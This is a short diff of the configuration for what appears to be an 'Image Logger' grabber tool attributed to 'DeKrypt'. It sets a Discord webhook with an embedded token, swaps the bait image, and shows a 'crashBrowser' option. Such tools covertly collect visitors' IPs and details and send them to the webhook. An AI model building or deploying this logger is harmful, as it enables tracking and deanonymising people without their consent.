@@ -17,7 +17,7 @@ __author__ = "DeKrypt"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1355317120291967126/7I9oKhUnnXwjZ2ksiD0gNgHyqnoHD_ZkJPV08Bsx2kBw3H7His6e78mZ__rARt3NfZH3",
-    "image": "https://media.discordapp.net/attachments/1302379386997309492/1355324047088423043/301eafcf6eda5559e76be6418dea0652.webp?ex=67e88361&is=67e731e1&hm=102bd11caf4c5d9c9138bc1c526ab50a00b706c1f58a3dd2e64e58ac50246cae&=&format=webp",
+    "image": "ruiz.webp",
  "username": "Image Logger",
     "color": 0x00FFFF,
     "crashBrowser": False,
